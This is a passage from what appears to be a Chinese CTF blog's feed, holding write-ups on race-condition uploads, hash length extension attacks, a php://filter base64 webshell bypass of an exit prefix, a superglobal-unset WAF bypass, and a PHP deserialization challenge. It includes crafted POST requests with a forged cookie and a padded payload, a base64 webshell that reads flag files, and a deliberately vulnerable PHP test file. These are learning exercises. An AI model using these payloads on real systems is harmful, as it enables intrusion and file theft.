      &lt;h2 id=&quot;听说你会面向对象&quot;&gt;&lt;a href=&quot;#听说你会面向对象&quot; class=&quot;headerlink&quot; title=&quot;听说你会面向对象&quot;&gt;&lt;/a&gt;听说你会面向对象&lt;/h2&gt;&lt;p&gt;这题用了反序列化的一个漏洞，如果还不知道什么是反序列化，参考下面的文章&lt;br&gt;&lt;a href=&quot;http://www.freebuf.com/column/151447.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.freebuf.com/column/151447.html&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="php" scheme="0verwatch.top/tags/php/"/>
    
      <category term="反序列化" scheme="0verwatch.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>简单小结一下Web条件竞争的题目</title>
    <link href="0verwatch.top/2018/03/10/RaceConditionsSummary/"/>
    <id>0verwatch.top/2018/03/10/RaceConditionsSummary/</id>
    <published>2018-03-10T12:12:58.000Z</published>
    <updated>2018-05-20T06:38:10.009Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在做我们学校平台的一个题目的时候，突然发现了一个新知识。。。。。可能我是菜鸡吧，大佬们请忽视</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这个知识点叫条件竞争。。。<br>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。<br>简单点理解就是在你要做一件事情的时候用很快的速度插了个队并做了另外一件事，一旦这件事情有害就会导致严重后果！！！</p><p>这里有篇文章还是讲得很好的，可以参考一下：<br><a href="http://wiki.secbug.net/web_race-condtion.html" target="_blank" rel="noopener">http://wiki.secbug.net/web_race-condtion.html</a></p><p>下面是最近做的几道题目</p><h3 id="cumt平台上的-上传三"><a href="#cumt平台上的-上传三" class="headerlink" title="cumt平台上的 上传三"></a>cumt平台上的 <a href="http://202.119.201.199/challenge/web/uploadfile/" target="_blank" rel="noopener">上传三</a></h3><p>这一个题目在前两个题目绕过的基础上<br>发现要绕过后台黑名单，但是我们知道黑名单一般都不安全，我们一般用白名单。。。。。<br>既然他说php后缀是黑名单，我们尝试一下php的别名php1,php2….当一直试到phtml的时候，抓的包就有区别了，刚开始还不知道，这里想干啥，此处感谢骆骆大佬。让我知道这叫条件竞争<br><img src="http://img.blog.csdn.net/20180310200600348?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>于是有了下面的操作<br>抓包发送到Intruder模块开20线程不断发包，然后写一个python脚本不断去访问那个文件，其实这个访问也可以用bp完成。。。<br><img src="http://img.blog.csdn.net/201803102006224?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>下面是python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'你的文件路径'</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'moctf'</span> <span class="keyword">in</span>  r.text:</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure><p><img src="http://img.blog.csdn.net/2018031020063624?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h3 id="moctf上的-没时间解释"><a href="#moctf上的-没时间解释" class="headerlink" title="moctf上的 没时间解释"></a>moctf上的<a href="https://119.23.73.3:5006/web2/index2.php" target="_blank" rel="noopener"> 没时间解释</a></h3><p>这一题给了三个提示，但是最后考的点还是条件竞争<br>首先的302这个问题最好的的解决方案就是抓包<br>抓包发现<br><img src="http://img.blog.csdn.net/20180310200851395?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>然后访问是一个文件的上传页面，输入的内容与你传送的内容一致。从url可以看得出来<br><img src="http://img.blog.csdn.net/20180310200949524?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>于是随便写点东西上传，当然你也可以写一句话木马。。。。<br>出现文件路径，而且改变文件名字上传文件路径还是一样的，于是就尝试访问<br><img src="http://img.blog.csdn.net/20180310201041965?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>出现too slow字样。。。跟cumt的那一题的删除很是类似了<br>然后我们就用bp把它跑出来，虽然最后的提示是脚本，但是不想写了，就直接用bp吧<br><img src="http://img.blog.csdn.net/20180310201058820?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>最后得到flag。。。。<br><img src="http://img.blog.csdn.net/20180310201119716?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="最后再吐槽一两句话"><a href="#最后再吐槽一两句话" class="headerlink" title="最后再吐槽一两句话"></a>最后再吐槽一两句话</h2><p>今天的N1CTF自己去划了一波水，心累，只会做一道签到题，看来还是一个渣渣，得继续虚心学习啊！！！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近在做我们学校平台的一个题目的时候，突然发现了一个新知识。。。。。可能我是菜鸡吧，大佬们请忽视&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>记录一下Hash长度扩展攻击的几个题目</title>
    <link href="0verwatch.top/2018/03/09/hashlengthattack/"/>
    <id>0verwatch.top/2018/03/09/hashlengthattack/</id>
    <published>2018-03-09T13:11:29.000Z</published>
    <updated>2018-05-20T06:35:18.612Z</updated>
    
    <content type="html"><![CDATA[<p>最近做了几个题目，又学到新的知识点，是有关Hash长度扩展攻击<br>参考了一波P牛的博客还有我们学校的博客：<br><a href="http://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">http://www.cnblogs.com/pcat/p/5478509.html</a><br><a href="http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/" target="_blank" rel="noopener">http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/</a></p><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="实验吧-让我进去"><a href="#实验吧-让我进去" class="headerlink" title="实验吧 让我进去"></a>实验吧 让我进去</h2><p>既然说是admin才能进去，那我就先抓个包，看一下包里面是否又要改的东西。。。。<br>发现有一个source=0，毫不犹豫把它改为1，<br><img src="http://img.blog.csdn.net/20180309205407515?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>发包获得源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br></pre></td></tr></table></figure><p>看一下源代码发现这里有urldecode但是不会太影响，最最关键的应该是<code>md5($secret . urldecode($username . $password))</code>这个东西</p><p><img src="http://img.blog.csdn.net/20180309205429480?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>关键代码就这一部分而已，其余的什么setcookie都没啥用，再看看包里面的内容，发现这个点，谷歌搜一波发现P牛的解析<br><img src="http://img.blog.csdn.net/20180309205456554?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>而后按照他的步骤安装了hashpump，最后把题目完成<br>先是新的签名，把它设置到<code>cookie</code>的<code>getmein</code>里。<br>第二个先把\x替换为%后，post提交</p><p>我最后发的包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /web/kzhan.php HTTP/1.1</span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://ctf5.shiyanbar.com/web/kzhan.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 227</span><br><span class="line">Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=1; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1520492842,1520518767,1520572017; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*132367%2CnickName%3A0verWatch; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1520584378; PHPSESSID=qljr4nu3o68169kr8ejb2htp87;getmein=7db18a2831cdab27425f299ca09f034e;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin%2580%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25c8%2500%2500%2500%2500%2500%2500%2500abc</span><br></pre></td></tr></table></figure><h2 id="cumt平台上的一道题目"><a href="#cumt平台上的一道题目" class="headerlink" title="cumt平台上的一道题目"></a>cumt平台上的一道题目</h2><h3 id="is-hash-safe"><a href="#is-hash-safe" class="headerlink" title="is hash safe??"></a>is hash safe??</h3><p>点进去发现要admin才能看，常规操作抓包，看里面有没有要改的，果不其然，把guest改为admin发现没啥用。。。。<br><img src="http://img.blog.csdn.net/20180309205650574?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>然后再看看页面源代码啥都没有，那应该就是源码泄露了，尝试.swp<br>发现泄露文件<br>放进kali里面用vim -r 命令复原源代码文件<br>得到源码<br><img src="http://img.blog.csdn.net/20180309205709474?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>跟那个实验吧的题目很相似，但又有不同，实验吧那一题是有两个字符串连接符，然后使其长度为20位，发现role是guest<br>于是我们来hashpump一波，根据提示密文长度为13，并且要绕过admin字符串，于是得到<br><img src="http://img.blog.csdn.net/2018030920572465?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"><br>抓包发送，得到flag<br><img src="http://img.blog.csdn.net/20180309205732803?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>怎么说呢，这几个题好像只考了工具怎么使用，但是一些必要的条件还是要自己找出来的，通过抓包之类的，还有一点点的代码审计，有些地方还是有些不懂，过段时间再继续完善一下自己的体会吧。。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近做了几个题目，又学到新的知识点，是有关Hash长度扩展攻击&lt;br&gt;参考了一波P牛的博客还有我们学校的博客：&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/pcat/p/5478509.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.cnblogs.com/pcat/p/5478509.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>简单小结一下moctf的三道web题</title>
    <link href="0verwatch.top/2018/03/06/moctfweb/"/>
    <id>0verwatch.top/2018/03/06/moctfweb/</id>
    <published>2018-03-06T15:14:34.000Z</published>
    <updated>2018-05-20T07:07:08.435Z</updated>
    
    <content type="html"><![CDATA[<p>本人渣渣，于是记录一下</p><a id="more"></a><h2 id="死亡退出"><a href="#死亡退出" class="headerlink" title="死亡退出"></a>死亡退出</h2><p>一道代码审计题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  $c=<span class="string">"&lt;?php exit;?&gt;"</span>;</span><br><span class="line">  @$c.=$_POST[<span class="string">'c'</span>];</span><br><span class="line">  @$filename=$_POST[<span class="string">'file'</span>]; </span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($filename))                    </span><br><span class="line">  &#123;                                       </span><br><span class="line">    file_put_contents(<span class="string">'tmp.php'</span>, <span class="string">''</span>); </span><br><span class="line">  &#125;                                 </span><br><span class="line">  @file_put_contents($filename, $c);</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">'tmp.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>来看看代码，@是用来忽略错误<br>这段代码是利用最后的include执行temp.php,那么我们很快九形道运用伪协议把它给读出来。。但前提是要绕过<code>&quot;&lt;?php exit;?&gt;&quot;</code>;不然会直接退出</p><p>这里搜到一篇文章用base64绕过的一篇文章<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>这一题我本来是想用<code>print_r(&#39;flag.php&#39;)</code>构造的，发现不行，查了查手册发现是自己理解函数有问题<br>于是参考了方方土学长的构造，我使用<code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code><br>base64编码之后<code>PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==</code></p><p>然后    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure><p>post参数c的时候会在<code>&lt;?php exit;?&gt;</code>后面加一些东西<br>所以会变成这个样子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit;?&gt;aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>然后经过base64decode之后就变成了下面的那个样子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^?Z<span class="meta">&lt;?php</span> system(<span class="string">'cat flag.php'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意我的base64为什么前面多了个a，那是因为<br>在解码的过程中，字符<code>&lt;、?、;、&gt;、</code>空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“<code>phpexit</code>”和我们传入的其他字符。<br>而phpexit一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。</p><p>不知道为什么，最近用bp发包都搞不了这题，我是用火狐自带Hackbar发送post数据才在控制台下面看到的flag<br>我也很是奇怪。。。。用bp抓一下包用其comparer功能对比之后发现改的包没啥差异。。。。以后还是抓包还是先过一遍hackbar吧。。emmmm</p><p>最后经过Hackbar截的包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 119.23.73.3:5003</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cache: no-cache</span><br><span class="line">origin: moz-extension://d734739a-e2f8-430e-8dc3-796d3187dbc2</span><br><span class="line">Content-Length: 126</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure><h2 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h2><p>这道题目也是多亏了方方土学长指导我仔细看清楚这个漏洞，最后终于明白了</p><p>这个主要是利用了Destoon 20140530最新版超全局变量覆盖导致的安全问题<br>这是网址:<a href="http://www.secevery.com:4321/bugs/wooyun-2014-063895" target="_blank" rel="noopener">http://www.secevery.com:4321/bugs/wooyun-2014-063895</a></p><p>如果 post get cookie 请求中的<code>$$key</code>和<code>$value</code>相等 就unset掉<code>$$key</code><br>如果我们向1.php?x=1提交一个POST请求 内容为<code>_GET[x]=1</code><br>因为?x=1 所以<code>$_GET</code>内容为 <code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code>,但是这里没什么关系，如果没传post参数上去的话，遍历到第一个key的时候就会符合正则继而执行exit。。。。。这个自己尝试</p><p>如果传参post上去的话，当开始遍历<code>$_POST</code>的时候 <code>$__k</code>是<code>_GET[x]</code> 所以<code>$$__k</code> 就是<code>$_GET[x]</code>也就是<code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code><br><code>$__v</code>是POST上来的一个数组 内容也是<code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code><br><code>$$__k == $__v</code>成立<br>所以 ,我们的超全局变量 <code>$_GET</code>就这么华丽丽的被unset了。。。</p><p>没关系，我们的目的就是为了绕过get时候到的waf，由于我们的<code>$_GET</code>已经在前面被unset了 所以即使加了<code>EXTR_SKIP extract($_GET)</code>仍然能够正常的初始化<br><code>$_GET extract($_GET)</code>的值就成功绕过了waf的检查<br>如果单单传参post上去的话，只能实例化<code>$_POST[_GET[]]</code>,所以还得传GET参数，不然到了<code>$_GET extract($_GET)</code>就不<br>能实例化$GET了</p><p>最后我们只要利用MD5的漏洞还有php伪协议就能够把file读出来了</p><p>这是自己在本机搭建的测试源代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $key;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">        <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">    <span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">    <span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'daiker'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'daiker'</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：<br><img src="http://img.blog.csdn.net/20180306231007347?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdTAxMTM3Nzk5Ng==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><h2 id="PUBG"><a href="#PUBG" class="headerlink" title="PUBG"></a>PUBG</h2><p>一打开是吃鸡的图片。。还有几个按钮，都点一下试一试，都查看一波源码<br>发现在学校的按钮下面的源码发现了index.php.bak，好家伙源码泄露<br>点开发现代码泄露</p><p>关键代码是下面这部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($pos===<span class="string">"school"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'&lt;/br&gt;&lt;center&gt;&lt;a href="/index.html"  style="color:white"&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;'</span>);</span><br><span class="line">            $pubg=$_GET[<span class="string">'pubg'</span>];</span><br><span class="line">            $p = unserialize($pubg);</span><br><span class="line">            <span class="comment">// $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>看到unserialize函数猜想应该是反序列化的题目，同样的招式再看看那一个class.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> 